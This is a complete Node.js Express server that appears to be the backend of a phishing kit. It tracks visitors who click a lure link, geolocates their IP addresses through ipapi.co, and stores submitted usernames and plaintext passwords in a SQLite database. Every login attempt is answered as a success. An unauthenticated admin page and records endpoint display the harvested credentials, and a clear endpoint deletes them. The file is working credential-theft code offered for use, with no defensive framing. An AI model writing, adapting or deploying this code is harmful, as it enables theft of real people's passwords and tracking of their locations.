const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const db = new sqlite3.Database('./login_records.db');

db.run(`CREATE TABLE IF NOT EXISTS records (
    id INTEGER PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    ip TEXT,
    location TEXT,
    timestamp TEXT
)`);

async function getLocation(ip) {
    if (!ip || ip === 'Unknown') return 'Unknown';
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        if (data && data.country_name) {
            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`.trim();
        }
    } catch (e) {}
    return 'Unknown Location';
}

async function saveRecord(type, username = null, password = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    const location = await getLocation(ip);

    db.run("INSERT INTO records (type, username, password, ip, location, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        [type, username, password, ip, location, timestamp]);

    console.log(`📍 ${type} | IP: ${ip} | Location: ${location}`);
}

// Record immediately when user clicks your link
app.get('/', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    await saveRecord('Page Visit', null, null, ip);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', async (req, res) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    await saveRecord('Page Visit', null, null, ip);
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', async (req, res) => {
    const { username, password, address } = req.body;
    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
    await saveRecord('Login Attempt', username, password, ip);
    res.json({ success: true });
});

app.get('/api/records', (req, res) => {
    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
        res.json(rows);
    });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', (req, res) => {
    db.run("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running with permanent storage`);
});